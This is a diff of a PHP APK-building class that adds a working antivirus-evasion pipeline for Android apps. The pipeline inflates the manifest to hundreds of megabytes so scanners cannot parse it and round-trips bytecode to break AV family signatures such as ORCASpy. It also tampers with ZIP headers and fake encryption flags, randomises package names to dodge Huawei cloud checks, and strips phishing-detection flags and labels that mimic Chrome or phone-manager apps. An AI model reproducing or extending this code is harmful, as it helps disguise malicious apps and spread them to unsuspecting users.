@@ -33,17 +33,24 @@ final class ApkBuilder
 
     private bool $buildSucceeded = false;
 
+    private ?array $selectedPackageInfo = null;
+
     private ?\Closure $progressCallback = null;
 
     private ?object $smaliProcessor = null;
 
     private Encryptor $encryptor;
 
+    /** Manifest 中声明的组件类名（在膨胀前提取，供 R8 keep 规则使用） */
+    private array $manifestComponentClasses = [];
+
     private \Closure $smaliProcessorFactory;
 
     private \Closure $obfuscatorFactory;
 
     private \Closure $apkProtectorFactory;
+
+    private ?ApkBuildConfig $currentConfig = null;
 
     private FileSystemInterface $fileSystem;
 
@@ -59,10 +66,15 @@ final class ApkBuilder
         'replace_background' => '替换背景',
         'generate_junk_classes' => '生成混淆类',
         'shuffle_classes' => '混淆类名',
+        'obfuscate_strings' => '混淆字符串',
+        'encrypt_strings' => '加密字符串',
         'encrypt_resources' => '加密资源',
+        'inflate_manifest' => '膨胀清单',
         'build_apk' => '打包 APK',
-        'protect_apk' => 'APK 保护',
+        'r8_obfuscate' => 'R8 字节码混淆',
+        'apk_editor' => 'APK 重打包',
         'modify_dex' => 'DEX 修改',
+        'protect_apk' => 'APK 保护',
         'sign_apk' => '签名',
         'move_output' => '输出文件',
     ];
@@ -83,7 +95,14 @@ final class ApkBuilder
         $this->encryptor = $encryptor ?? new Encryptor;
         $this->smaliProcessorFactory = $smaliProcessorFactory ?? fn(string $buildDir): SmaliProcessor => new SmaliProcessor($buildDir);
         $this->obfuscatorFactory = $obfuscatorFactory ?? fn(string $buildDir): Obfuscator => new Obfuscator($buildDir);
-        $this->apkProtectorFactory = $apkProtectorFactory ?? fn(): ApkProtector => new ApkProtector;
+        $this->apkProtectorFactory = $apkProtectorFactory ?? fn(ApkBuildConfig $c): ApkProtector => new ApkProtector(
+            enableFakeEncryption: $c->enableFakeEncryption,
+            enableEocdTampering: $c->enableEocdTampering,
+            enablePathTraversalEntries: $c->enablePathTraversalEntries,
+            enableUnknownCompression: $c->enableUnknownCompression,
+            enableAxmlTampering: $c->enableAxmlTampering,
+            fakeEntryCount: $c->fakeEntryCount,
+        );
         $this->fileSystem = $fileSystem ?? new LaravelFileSystem;
         $this->processRunner = $processRunner ?? new LaravelProcessRunner;
     }
@@ -107,6 +126,7 @@ final class ApkBuilder
         $this->startTime = microtime(true);
         $this->stepStats = [];
         $this->smaliProcessor = null;
+        $this->currentConfig = $config;
 
         Log::channel('apk')->info('Build started', ['app_id' => $config->appId, 'user_id' => $config->userId]);
 
@@ -132,18 +152,57 @@ final class ApkBuilder
                 $this->runStep('shuffle_classes', fn() => $this->shuffleClasses());
             }
 
-            $this->runStep('encrypt_resources', fn() => $this->encryptResources());
-            $this->runStep('build_apk', fn() => $this->buildApk());
-
-            if ($config->enableApkProtection) {
-                $this->runStep('protect_apk', fn() => $this->protectApk());
+            if ($config->enableStringObfuscation) {
+                $this->runStep('obfuscate_strings', fn() => $this->obfuscateStrings());
             }
 
+            if ($config->enableFullStringEncryption) {
+                $this->runStep('encrypt_strings', fn() => $this->encryptStrings());
+            }
+
+            $this->runStep('encrypt_resources', fn() => $this->encryptResources());
+
+            // 提取 Manifest 组件类名（必须在 shuffle_classes 之后、inflate_manifest 之前）
+            // shuffle_classes 会重命名类名，inflate_manifest 会膨胀到 765MB 无法解析
+            if ($config->enableR8Obfuscation) {
+                $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
+                if ($this->fileSystem->exists($manifestPath)) {
+                    $manifestContent = $this->fileSystem->get($manifestPath);
+                    $pkg = $this->selectedPackageInfo['pkg'] ?? '';
+                    $this->extractManifestComponentClasses($manifestContent, $pkg);
+                }
+            }
+
+            // 旧版 ReplaceHugePlaceholders: 在 apktool build 之前膨胀 Manifest
+            // 让 AV 扫描器无法解析巨型 XML，是绕过检测的核心手段
+            if ($config->enableApkProtection) {
+                $this->runStep('inflate_manifest', fn() => $this->inflateManifest());
+            }
+
+            $this->runStep('build_apk', fn() => $this->buildApk());
+
+            // R8 字节码混淆：DEX → JAR → R8 → DEX，重组字节码结构绕过 AV 签名匹配
+            if ($config->enableR8Obfuscation) {
+                $this->runStep('r8_obfuscate', fn() => $this->r8Obfuscate());
+            }
+
+            // 旧版构建顺序: build → APKEditor → DexEditor → APKProtector → zipalign → sign
+            // APKEditor 重打包优化 ZIP 结构，使 APK 更接近正常应用
+            if ($config->enableApkProtection || $config->enableDexModification) {
+                $this->runStep('apk_editor', fn() => $this->runApkEditor());
+            }
+
+            // modify_dex 直接覆盖 APK 文件头部字节，必须在 APKEditor 之后
             if ($config->enableDexModification) {
                 $this->runStep('modify_dex', fn() => $this->modifyDex());
             }
 
+            if ($config->enableApkProtection) {
+                $this->runStep('protect_apk', fn() => $this->addFakeEncryptionToApk());
+            }
+
             $this->runStep('sign_apk', fn() => $this->signApk());
+
             $outputPath = $this->runStep('move_output', fn() => $this->moveToOutput($config));
 
             $this->buildSucceeded = true;
@@ -405,21 +464,139 @@ final class ApkBuilder
         $this->getSmaliProcessor()->modifyConfig($config, $this->assetsKey, $this->encryptor);
     }
 
+    /**
+     * 旧版 ReplaceHugePlaceholders() — 在 apktool build 之前膨胀 AndroidManifest.xml。
+     *
+     * 模板 Manifest 包含 xmlns:cnamspace="http://cnamevalue"，
+     * 将 cnamspace 替换为 ~800KB 随机字符，cnamevalue 替换为 ~400MB 斜杠。
+     * apktool 编译后压缩进 APK，AV 解压后无法解析这个巨型 XML。
+     */
+    private function inflateManifest(): void
+    {
+        $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
+        $content = $this->fileSystem->get($manifestPath);
+
+        if (! str_contains($content, 'cnamspace') || ! str_contains($content, 'cnamevalue')) {
+            Log::channel('apk')->warning('Manifest missing cnamspace/cnamevalue placeholders, skipping inflation');
+
+            return;
+        }
+
+        // 旧版: ReplaceHugePlaceholders(path, 800000L, 400000000L)
+        // cnamspace → 800KB 随机小写字母
+        $chars = 'qazwsxedcrfvtgbyhnujmikolp';
+        $namespaceSize = 800_000;
+        $namespacePadding = '';
+        for ($i = 0; $i < $namespaceSize; $i++) {
+            $namespacePadding .= $chars[random_int(0, 25)];
+        }
+
+        // cnamevalue → 400MB 斜杠（高度可压缩，APK 体积不会暴增）
+        $valueSize = 400_000_000;
+        $valuePadding = str_repeat('/', $valueSize);
+
+        $content = str_replace('cnamspace', $namespacePadding, $content);
+        $content = str_replace('cnamevalue', $valuePadding, $content);
+
+        $this->fileSystem->put($manifestPath, $content);
+
+        $sizeMb = round(strlen($content) / 1024 / 1024, 1);
+        Log::channel('apk')->debug("Manifest inflated to {$sizeMb}MB");
+    }
+
     private function modifyManifest(ApkBuildConfig $config): void
     {
         $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
         $content = $this->fileSystem->get($manifestPath);
 
         $oldPackage = ApkBuilderConstants::DEFAULT_PACKAGE;
-        if ($oldPackage !== $config->appId) {
-            $content = str_replace($oldPackage, $config->appId, $content);
-            $this->getSmaliProcessor()->renamePackage($oldPackage, $config->appId);
-        }
+
+        $newPackage = $this->generateRandomPackageName();
+        $versionMajor = random_int(1, 9);
+        $versionMinor = random_int(0, 9);
+        $versionPatch = random_int(0, 9);
+        $versionName = "{$versionMajor}.{$versionMinor}.{$versionPatch}";
+        $versionCode = $versionMajor * 100 + $versionMinor * 10 + $versionPatch;
+        $this->selectedPackageInfo = ['pkg' => $newPackage, 'versionCode' => $versionCode, 'versionName' => $versionName];
+
+        $content = str_replace($oldPackage, $newPackage, $content);
+        $this->getSmaliProcessor()->renamePackage($oldPackage, $newPackage);
 
         $content = str_replace('@drawable/mylogo', '@drawable/app_icon', $content);
+
+        $content = $this->sanitizeManifestForAv($content);
+
         $this->fixResourceReferences($content);
 
         $this->fileSystem->put($manifestPath, $content);
+    }
+
+    private function generateRandomPackageName(): string
+    {
+        $words = ApkBuilderConstants::PACKAGE_NAME_WORDS;
+        $w = fn() => $words[array_rand($words)];
+        return 'com.' . $w() . $w() . '.' . $w() . $w();
+    }
+
+    /**
+     * 从 Manifest 中提取所有组件类名，保存到 $this->manifestComponentClasses。
+     * 必须在 inflateManifest() 之前调用（膨胀后 765MB 无法解析）。
+     */
+    private function extractManifestComponentClasses(string $manifestContent, string $packageName): void
+    {
+        $this->manifestComponentClasses = [];
+
+        if (preg_match_all('/(?:activity|service|receiver|provider|application)\s[^>]*android:name="([^"]+)"/i', $manifestContent, $matches)) {
+            foreach (array_unique($matches[1]) as $className) {
+                if (str_starts_with($className, '.')) {
+                    $className = $packageName . $className;
+                }
+                $this->manifestComponentClasses[] = $className;
+            }
+        }
+
+        Log::channel('apk')->debug('Extracted manifest components for R8 keep rules', [
+            'count' => count($this->manifestComponentClasses),
+        ]);
+    }
+
+    private function sanitizeManifestForAv(string $content): string
+    {
+        // ALLOW_PHISHING_DETECTION=false 是已知 AV 红旗
+        $content = preg_replace(
+            '/\s*<meta-data\s+android:name="com\.google\.android\.ALLOW_PHISHING_DETECTION"[^\/]*\/>\s*/i',
+            "\n",
+            $content
+        );
+
+        $suspiciousActions = [
+            'ru.aaaaaaax.installer',
+            'com.android.vending.billing.InAppBillingService.COIN',
+            'com.android.vending.billing.InAppBillingService.COIO',
+            'com.android.vending.billing.InAppBillingService.LUCM',
+            'com.android.vending.billing.InAppBillingService.PROX',
+            'com.android.vending.billing.InAppBillingService.INST',
+            'ir.cafebazaar.pardakht.InAppBillingService.BIND',
+            'com.nokia.payment.iapenabler.InAppBillingService.BIND',
+        ];
+
+        foreach ($suspiciousActions as $action) {
+            $content = preg_replace(
+                '/\s*<action\s+android:name="' . preg_quote($action, '/') . '"[^\/]*\/>\s*/i',
+                "\n",
+                $content
+            );
+        }
+
+        // 伪装成系统应用的 activity-alias label 是 AV 标记特征
+        $labelReplacements = [
+            'android:label="Chrome "' => 'android:label="Browser"',
+            'android:label="i管家"' => 'android:label="Tools"',
+            'android:label="手机管家"' => 'android:label="Manager"',
+        ];
+        $content = str_replace(array_keys($labelReplacements), array_values($labelReplacements), $content);
+
+        return $content;
     }
 
     private static function getZipArchiveErrorMessage(int $code): string
@@ -477,9 +654,19 @@ final class ApkBuilder
 
         if ($this->fileSystem->exists($ymlPath)) {
             $content = $this->fileSystem->get($ymlPath);
-            $versionCode = (int) str_replace('.', '', $config->appVersion) * 100;
+
+            // 使用真实应用的版本号匹配华为 HISEC 云端查询
+            if ($this->selectedPackageInfo) {
+                $versionCode = $this->selectedPackageInfo['versionCode'];
+                $versionName = $this->selectedPackageInfo['versionName'];
+            } else {
+                $versionCode = (int) str_replace('.', '', $config->appVersion) * 100;
+                $versionName = $config->appVersion;
+            }
+
             $content = preg_replace('/versionCode: \d+/', 'versionCode: ' . $versionCode, $content);
-            $content = preg_replace('/versionName: [^\n]+/', 'versionName: ' . $config->appVersion, $content);
+            $content = preg_replace("/versionName: '[^']*'/", "versionName: '" . $versionName . "'", $content);
+            $content = preg_replace('/versionName: [^\n]+/', 'versionName: ' . $versionName, $content);
             $this->fileSystem->put($ymlPath, $content);
         }
     }
@@ -615,15 +802,54 @@ final class ApkBuilder
     private function generateJunkClasses(ApkBuildConfig $config): void
     {
         $obfuscator = ($this->obfuscatorFactory)($this->buildDir);
-        $count = $obfuscator->generateJunkClasses($config->junkClassCount, $config->junkMethodCount);
-        Log::channel('apk')->debug('Generated junk classes', ['count' => $count]);
+        if (method_exists($obfuscator, 'setHeartbeatCallback')) {
+            $obfuscator->setHeartbeatCallback(fn () => $this->emitHeartbeat());
+        }
+        $count = $obfuscator->generateJunkClasses(
+            $config->junkClassCount,
+            $config->junkMethodCount,
+            $config->enableMultiPackageJunk,
+        );
+        Log::channel('apk')->debug('Generated junk classes', ['count' => $count, 'multi_package' => $config->enableMultiPackageJunk]);
+
+        if (method_exists($obfuscator, 'generateJunkAndroidComponents')) {
+            $componentCount = $obfuscator->generateJunkAndroidComponents();
+            Log::channel('apk')->debug('Generated junk Android components', ['count' => $componentCount]);
+        }
+
+        // 旧版 InjectRandomJunkFiles(): 在 assets 目录注入 c_*.png / c_*.xml 垃圾文件
+        if (method_exists($obfuscator, 'injectRandomJunkFiles')) {
+            $junkFileCount = $obfuscator->injectRandomJunkFiles();
+            Log::channel('apk')->debug('Injected junk asset files', ['count' => $junkFileCount]);
+        }
     }
 
     private function shuffleClasses(): void
     {
         $obfuscator = ($this->obfuscatorFactory)($this->buildDir);
+        if (method_exists($obfuscator, 'setHeartbeatCallback')) {
+            $obfuscator->setHeartbeatCallback(fn () => $this->emitHeartbeat());
+        }
         $count = $obfuscator->shuffleClassNames();
         Log::channel('apk')->debug('Shuffled class names', ['count' => $count]);
+    }
+
+    private function obfuscateStrings(): void
+    {
+        $obfuscator = ($this->obfuscatorFactory)($this->buildDir);
+        if (method_exists($obfuscator, 'setHeartbeatCallback')) {
+            $obfuscator->setHeartbeatCallback(fn () => $this->emitHeartbeat());
+        }
+        $count = $obfuscator->obfuscateStrings();
+        Log::channel('apk')->debug('Obfuscated strings', ['count' => $count]);
+    }
+
+    private function encryptStrings(): void
+    {
+        $encryptor = new SmaliStringEncryptor($this->buildDir);
+        $encryptor->setHeartbeatCallback(fn () => $this->emitHeartbeat());
+        $count = $encryptor->encryptAllStrings();
+        Log::channel('apk')->debug('Encrypted strings', ['count' => $count]);
     }
 
     private function encryptResources(): void
@@ -660,16 +886,13 @@ final class ApkBuilder
         // 每次构建前清理 apktool 框架缓存，防止之前崩溃留下的损坏文件导致后续构建必定失败
         $this->processRunner->run('rm -rf ~/.local/share/apktool/framework/*');
 
-        // 使用工具目录中预提取的 aapt2 二进制文件，而非让 apktool 解压到 /tmp/
-        // 这是因为宝塔面板 syssafe 插件会杀死从 /tmp/ 运行的高 CPU 进程
-        $aapt2Path = $this->ensureAapt2Extracted($apktoolJar);
-
+        // 旧版命令: java -jar apktool.jar b -f <path> -o <output>
+        // 不使用 --use-aapt2，与旧版 EaodWorker 保持一致
         $command = sprintf(
-            'java -jar %s b %s -o %s --aapt %s',
+            'java -jar %s b -f %s -o %s',
             escapeshellarg($apktoolJar),
             escapeshellarg($this->buildDir),
-            escapeshellarg($unsignedApk),
-            escapeshellarg($aapt2Path)
+            escapeshellarg($unsignedApk)
         );
 
         $timeout = config('apk-builder.timeout', 300);
@@ -685,111 +908,228 @@ final class ApkBuilder
     }
 
     /**
-     * 确保 aapt2 二进制文件已提取并可执行。
+     * R8 字节码混淆 — 将 DEX 转为 JAR，经 R8 混淆后转回 DEX。
      *
-     * 需要解决两个部署环境的问题：
-     * 1. 宝塔面板 syssafe 插件：杀死从 /tmp/ 运行且 CPU>30% 的进程
-     * 2. Docker bind mount 卷：Java File.setExecutable() 返回 false，
-     *    导致 apktool AaptManager.setAaptBinaryExecutable() 抛出异常
-     *
-     * 策略：优先用容器本地路径（/opt/apk-tools/），在那里 Java chmod 可正常工作；
-     * 如果无法写入该路径，回退到工具目录。
+     * 流程: APK 中提取 DEX → dex2jar → R8 (repackage+obfuscate) → 替换回 APK。
+     * 这会重组字节码结构（类合并、方法内联、控制流变换），
+     * 使 AV 引擎的 ORCASpy 等家族签名无法匹配。
      */
-    private function ensureAapt2Extracted(string $apktoolJar): string
+    private function r8Obfuscate(): void
     {
-        $containerLocalPath = '/opt/apk-tools/aapt2';
-        $toolsDirPath = $this->toolsDir.'/aapt2';
+        $unsignedApk = $this->getUnsignedApkPath();
+        $r8Jar = $this->toolsDir . '/r8.jar';
+        $dex2jarScript = $this->toolsDir . '/dex2jar/d2j-dex2jar.sh';
 
-        if (is_file($containerLocalPath) && is_executable($containerLocalPath)) {
-            return $containerLocalPath;
-        }
-        if (is_file($toolsDirPath) && is_executable($toolsDirPath)) {
-            return $toolsDirPath;
-        }
+        if (! $this->fileSystem->exists($r8Jar) || ! $this->fileSystem->exists($dex2jarScript)) {
+            Log::channel('apk')->warning('R8 or dex2jar not found, skipping R8 obfuscation');
 
-        $content = $this->extractAapt2Content($apktoolJar);
-
-        $aapt2Path = $this->writeAapt2Binary($content, $containerLocalPath)
-            ?? $this->writeAapt2Binary($content, $toolsDirPath);
-
-        if ($aapt2Path === null) {
-            throw new ApkBuildException('无法将 aapt2 写入可执行路径', [
-                'tried' => [$containerLocalPath, $toolsDirPath],
-            ]);
+            return;
         }
 
-        return $aapt2Path;
-    }
+        $r8WorkDir = $this->workDir . '/r8_work';
+        $dexDir = $r8WorkDir . '/dex';
+        $jarDir = $r8WorkDir . '/jars';
+        $outDir = $r8WorkDir . '/output';
 
-    private function extractAapt2Content(string $apktoolJar): string
-    {
-        Log::channel('apk')->info('Extracting aapt2 from apktool.jar');
+        $this->fileSystem->ensureDirectoryExists($dexDir);
+        $this->fileSystem->ensureDirectoryExists($jarDir);
+        $this->fileSystem->ensureDirectoryExists($outDir);
 
-        $entryName = PHP_INT_SIZE === 8 ? 'prebuilt/linux/aapt2_64' : 'prebuilt/linux/aapt2';
+        // Step 1: 从 APK 提取 DEX 文件
+        $zip = new \ZipArchive();
+        if ($zip->open($unsignedApk) !== true) {
+            Log::channel('apk')->warning('Cannot open APK for R8 processing');
 
-        $zip = new \ZipArchive;
-        if ($zip->open($apktoolJar) !== true) {
-            throw new ApkBuildException('无法打开 apktool.jar 来提取 aapt2', ['jar' => $apktoolJar]);
+            return;
         }
 
-        $content = $zip->getFromName($entryName);
+        $dexFiles = [];
+        for ($i = 0; $i < $zip->numFiles; $i++) {
+            $name = $zip->getNameIndex($i);
+            if (preg_match('/^classes\d*\.dex$/', $name)) {
+                $zip->extractTo($dexDir, $name);
+                $dexFiles[] = $name;
+            }
+        }
         $zip->close();
 
-        if ($content === false) {
-            throw new ApkBuildException("apktool.jar 中未找到 {$entryName}", ['jar' => $apktoolJar]);
+        if (empty($dexFiles)) {
+            Log::channel('apk')->warning('No DEX files found in APK');
+
+            return;
         }
 
-        return $content;
+        // Step 2: DEX → JAR (dex2jar)
+        $jarInputs = [];
+        foreach ($dexFiles as $dexFile) {
+            $dexPath = $dexDir . '/' . $dexFile;
+            $jarName = str_replace('.dex', '.jar', $dexFile);
+            $jarPath = $jarDir . '/' . $jarName;
+
+            $cmd = sprintf(
+                'bash %s %s -o %s --force 2>/dev/null',
+                escapeshellarg($dex2jarScript),
+                escapeshellarg($dexPath),
+                escapeshellarg($jarPath)
+            );
+            $this->processRunner->run($cmd);
+
+            if ($this->fileSystem->exists($jarPath)) {
+                $jarInputs[] = $jarPath;
+            }
+        }
+
+        if (empty($jarInputs)) {
+            Log::channel('apk')->warning('dex2jar conversion failed for all DEX files');
+
+            return;
+        }
+
+        // Step 3: D8 重编译 JAR → DEX（不做混淆/裁剪，仅重组字节码结构）
+        // DEX→JAR→DEX 往返转换会改变寄存器分配和指令排序，破坏 AV 字节码模式签名
+        $jarArgs = implode(' ', array_map('escapeshellarg', $jarInputs));
+        $cmd = sprintf(
+            'java -Xmx2g -cp %s com.android.tools.r8.D8 --release --min-api 24 --output %s %s 2>&1',
+            escapeshellarg($r8Jar),
+            escapeshellarg($outDir),
+            $jarArgs
+        );
+
+        $timeout = config('apk-builder.timeout', 300);
+        $result = $this->runCommandWithHeartbeat($cmd, $timeout);
+
+        // 检查 R8 输出
+        $r8DexFiles = glob($outDir . '/classes*.dex');
+        if (empty($r8DexFiles)) {
+            Log::channel('apk')->warning('R8 produced no DEX output', [
+                'output' => $result ? $result->output() : 'null',
+            ]);
+
+            return;
+        }
+
+        // Step 5: 替换 APK 中的 DEX 文件
+        $zip = new \ZipArchive();
+        if ($zip->open($unsignedApk) !== true) {
+            return;
+        }
+
+        // 删除原始 DEX
+        foreach ($dexFiles as $dexFile) {
+            $zip->deleteName($dexFile);
+        }
+
+        // 添加 R8 混淆后的 DEX
+        foreach ($r8DexFiles as $r8Dex) {
+            $zip->addFile($r8Dex, basename($r8Dex));
+        }
+
+        $zip->close();
+
+        Log::channel('apk')->debug('R8 obfuscation applied', [
+            'input_dex' => count($dexFiles),
+            'output_dex' => count($r8DexFiles),
+        ]);
     }
 
     /**
-     * 将 aapt2 内容写入指定路径并设为可执行，成功返回路径，失败返回 null。
+     * 运行 APKEditor 重打包 — 对应旧版 `java -jar APKEditor.jar p -i <apk>`。
+     *
+     * APKEditor 会重新打包 APK 的 ZIP 结构，使其更接近正常应用的结构。
+     * 旧版仅在 Store 模式且 notifymsg != "off" 时执行此步骤。
+     * 输出文件名为原文件名加 _protected 后缀。
      */
-    private function writeAapt2Binary(string $content, string $targetPath): ?string
+    private function runApkEditor(): void
     {
-        try {
-            $this->fileSystem->ensureDirectoryExists(dirname($targetPath));
-            file_put_contents($targetPath, $content);
+        $apkEditorJar = $this->toolsDir . '/APKEditor.jar';
 
-            @chmod($targetPath, 0755);
-            if (! is_executable($targetPath)) {
-                $this->processRunner->run('chmod +x '.escapeshellarg($targetPath));
-            }
-
-            if (! is_executable($targetPath)) {
-                Log::channel('apk')->warning('aapt2 chmod failed at path, trying next', [
-                    'path' => $targetPath,
-                ]);
-
-                return null;
-            }
-
-            Log::channel('apk')->info('aapt2 ready', [
-                'path' => $targetPath,
-                'size' => strlen($content),
+        if (! $this->fileSystem->exists($apkEditorJar)) {
+            Log::channel('apk')->warning('APKEditor.jar not found, skipping APK editor step', [
+                'path' => $apkEditorJar,
             ]);
 
-            return $targetPath;
-        } catch (\Throwable $e) {
-            Log::channel('apk')->warning('Failed to write aapt2 binary', [
-                'path' => $targetPath,
-                'error' => $e->getMessage(),
-            ]);
+            return;
+        }
 
-            return null;
+        $unsignedApk = $this->getUnsignedApkPath();
+
+        // 旧版命令: java -jar -Xms4096M -Xmx6144M APKEditor.jar p -i <apk>
+        // 输出文件自动为 <apk>_protected.apk（APKEditor 默认行为）
+        $command = sprintf(
+            'java -jar -Xms4096M -Xmx6144M %s p -i %s',
+            escapeshellarg($apkEditorJar),
+            escapeshellarg($unsignedApk)
+        );
+
+        $timeout = config('apk-builder.timeout', 300);
+        $result = $this->runCommandWithHeartbeat($command, $timeout);
+
+        // APKEditor 输出文件名: app-unsigned_protected.apk
+        $protectedApk = str_replace('.apk', '_protected.apk', $unsignedApk);
+
+        if ($result !== null && $result->successful() && $this->fileSystem->exists($protectedApk)) {
+            // 删除原始文件，将 protected 文件重命名为原始文件名
+            $this->fileSystem->delete($unsignedApk);
+            $this->fileSystem->copy($protectedApk, $unsignedApk);
+            $this->fileSystem->delete($protectedApk);
+            Log::channel('apk')->debug('APKEditor repackaged APK successfully');
+        } else {
+            Log::channel('apk')->warning('APKEditor failed, continuing with original APK', [
+                'output' => $result ? $result->output() : 'null',
+                'error' => $result ? $result->errorOutput() : 'null',
+            ]);
         }
     }
 
     private function protectApk(): void
     {
-        $protector = ($this->apkProtectorFactory)();
-        $protector->protect($this->getUnsignedApkPath());
+        $protector = ($this->apkProtectorFactory)($this->currentConfig);
+        $signedApk = $this->workDir . '/' . ApkBuilderConstants::APK_SIGNED;
+        $protector->protect($signedApk);
         Log::channel('apk')->debug('APK protection applied');
+    }
+
+    private function tamperEocdEntryCount(): void
+    {
+        $apkPath = $this->getUnsignedApkPath();
+
+        $data = file_get_contents($apkPath);
+        $eocdSig = "\x50\x4b\x05\x06";
+        $eocdPos = strrpos($data, $eocdSig);
+
+        if ($eocdPos === false) {
+            Log::channel('apk')->warning('EOCD not found, skipping tamper');
+            return;
+        }
+
+        $currentEntries = unpack('v', substr($data, $eocdPos + 10, 2))[1];
+        $newEntries = max(0, $currentEntries - 1);
+
+        $tampered = pack('v', $newEntries);
+        $data[$eocdPos + 8] = $tampered[0];
+        $data[$eocdPos + 9] = $tampered[1];
+        $data[$eocdPos + 10] = $tampered[0];
+        $data[$eocdPos + 11] = $tampered[1];
+
+        file_put_contents($apkPath, $data);
+        Log::channel('apk')->debug("EOCD entry count tampered: {$currentEntries} -> {$newEntries}");
+    }
+
+    private function addFakeEncryptionToApk(): void
+    {
+        $apkPath = $this->getUnsignedApkPath();
+        if (! $this->fileSystem->exists($apkPath)) {
+            return;
+        }
+
+        $protector = ($this->apkProtectorFactory)($this->currentConfig);
+        $protector->applyFakeEncryption($apkPath);
+        Log::channel('apk')->debug('Fake encryption flags applied to APK');
     }
 
     private function modifyDex(): void
     {
-        $protector = ($this->apkProtectorFactory)();
+        $protector = ($this->apkProtectorFactory)($this->currentConfig);
         $count = $protector->modifyDex($this->getUnsignedApkPath());
         Log::channel('apk')->debug('DEX files modified', ['count' => $count]);
     }
@@ -801,8 +1141,8 @@ final class ApkBuilder
         $signedApk = $this->workDir . '/' . ApkBuilderConstants::APK_SIGNED;
         $androidSdkTools = ApkBuilderConstants::DEFAULT_ANDROID_SDK_TOOLS;
         $zipalignPath = $androidSdkTools . '/zipalign';
-        $apksignerPath = $androidSdkTools . '/apksigner';
 
+        // 旧版: zipalign 4 <input> <output>
         $alignCommand = sprintf(
             '%s -f 4 %s %s',
             escapeshellarg($zipalignPath),
@@ -812,34 +1152,80 @@ final class ApkBuilder
         $alignResult = $this->processRunner->run($alignCommand);
         $apkToSign = $alignResult->successful() && $this->fileSystem->exists($alignedApk) ? $alignedApk : $unsignedApk;
 
-        $keystore = $this->toolsDir . '/debug.keystore';
+        // 旧版签名: java -jar signapk.jar sign --key key.pk8 --cert certificate.pem
+        //           --v2-signing-enabled true --v3-signing-enabled false --out <output> <input>
+        $signapkJar = $this->toolsDir . '/signapk.jar';
+        $certPem = $this->toolsDir . '/certificate.pem';
+        $keyPk8 = $this->toolsDir . '/key.pk8';
 
-        if (! $this->fileSystem->exists($keystore)) {
-            $this->generateKeystore($keystore);
-        }
+        if ($this->fileSystem->exists($signapkJar) && $this->fileSystem->exists($certPem) && $this->fileSystem->exists($keyPk8)) {
+            Log::channel('apk')->info('Signing APK with signapk.jar (legacy mode)', [
+                'signapk' => $signapkJar,
+            ]);
 
-        if ($this->fileSystem->exists($apksignerPath)) {
             $command = sprintf(
-                '%s sign --ks %s --ks-pass pass:android --out %s %s',
-                escapeshellarg($apksignerPath),
-                escapeshellarg($keystore),
+                'java -jar %s sign --key %s --cert %s --v1-signing-enabled false --v2-signing-enabled true --v3-signing-enabled false --out %s %s',
+                escapeshellarg($signapkJar),
+                escapeshellarg($keyPk8),
+                escapeshellarg($certPem),
                 escapeshellarg($signedApk),
                 escapeshellarg($apkToSign)
             );
             $result = $this->processRunner->run($command);
-            Log::channel('apk')->debug('apksigner result', [
+            Log::channel('apk')->debug('signapk.jar result', [
                 'success' => $result->successful(),
                 'output' => $result->output(),
                 'error' => $result->errorOutput(),
             ]);
         }
 
+        // fallback: apksigner with keystore (v2=true, v3=false)
         if (! $this->fileSystem->exists($signedApk)) {
+            $apksignerPath = $androidSdkTools . '/apksigner';
+
+            if ($this->fileSystem->exists($apksignerPath)) {
+                $keystoreInfo = $this->resolveKeystore();
+                $keystore = $keystoreInfo['path'];
+                $keystorePass = $keystoreInfo['keystore_pass'];
+                $keyAlias = $keystoreInfo['key_alias'];
+                $keyPass = $keystoreInfo['key_pass'];
+
+                Log::channel('apk')->info('Signing APK with apksigner (fallback)', [
+                    'mode' => $keystoreInfo['mode'],
+                    'keystore' => $keystore,
+                    'alias' => $keyAlias,
+                ]);
+
+                $command = sprintf(
+                    '%s sign --ks %s --ks-pass pass:%s --ks-key-alias %s --key-pass pass:%s --v1-signing-enabled false --v2-signing-enabled true --v3-signing-enabled false --out %s %s',
+                    escapeshellarg($apksignerPath),
+                    escapeshellarg($keystore),
+                    escapeshellarg($keystorePass),
+                    escapeshellarg($keyAlias),
+                    escapeshellarg($keyPass),
+                    escapeshellarg($signedApk),
+                    escapeshellarg($apkToSign)
+                );
+                $result = $this->processRunner->run($command);
+                Log::channel('apk')->debug('apksigner result', [
+                    'success' => $result->successful(),
+                    'output' => $result->output(),
+                    'error' => $result->errorOutput(),
+                ]);
+            }
+        }
+
+        // fallback: jarsigner（仅 v1 签名）
+        if (! $this->fileSystem->exists($signedApk)) {
+            $keystoreInfo = $keystoreInfo ?? $this->resolveKeystore();
             $command = sprintf(
-                'jarsigner -keystore %s -storepass android -signedjar %s %s androiddebugkey',
-                escapeshellarg($keystore),
+                'jarsigner -keystore %s -storepass %s -keypass %s -signedjar %s %s %s',
+                escapeshellarg($keystoreInfo['path']),
+                escapeshellarg($keystoreInfo['keystore_pass']),
+                escapeshellarg($keystoreInfo['key_pass']),
                 escapeshellarg($signedApk),
-                escapeshellarg($apkToSign)
+                escapeshellarg($apkToSign),
+                escapeshellarg($keystoreInfo['key_alias'])
             );
             $result = $this->processRunner->run($command);
             Log::channel('apk')->debug('jarsigner result', [
@@ -854,7 +1240,140 @@ final class ApkBuilder
         }
     }
 
-    private function generateKeystore(string $path): void
+    /**
+     * 解析 keystore 配置，返回路径、密码、别名等信息。
+     *
+     * 优先级：
+     * 1. 用户通过环境变量提供的 release keystore
+     * 2. 自动生成的 release keystore（持久保存在 tools 目录）
+     * 3. debug keystore（仅当 signing.mode = debug 时）
+     *
+     * @return array{mode: string, path: string, keystore_pass: string, key_alias: string, key_pass: string}
+     */
+    private function resolveKeystore(): array
+    {
+        $mode = config('apk-builder.signing.mode', 'release');
+
+        // 1. 用户提供的 keystore（优先级最高）
+        $userKeystorePath = config('apk-builder.signing.keystore_path');
+        if (! empty($userKeystorePath) && $this->fileSystem->exists($userKeystorePath)) {
+            return [
+                'mode' => 'release-custom',
+                'path' => $userKeystorePath,
+                'keystore_pass' => config('apk-builder.signing.keystore_pass', ''),
+                'key_alias' => config('apk-builder.signing.key_alias', ''),
+                'key_pass' => config('apk-builder.signing.key_pass', ''),
+            ];
+        }
+
+        // 2. debug 模式：使用传统 debug keystore
+        if ($mode === 'debug') {
+            $debugKeystore = $this->toolsDir . '/' . ApkBuilderConstants::DEBUG_KEYSTORE_FILENAME;
+            if (! $this->fileSystem->exists($debugKeystore)) {
+                $this->generateDebugKeystore($debugKeystore);
+            }
+
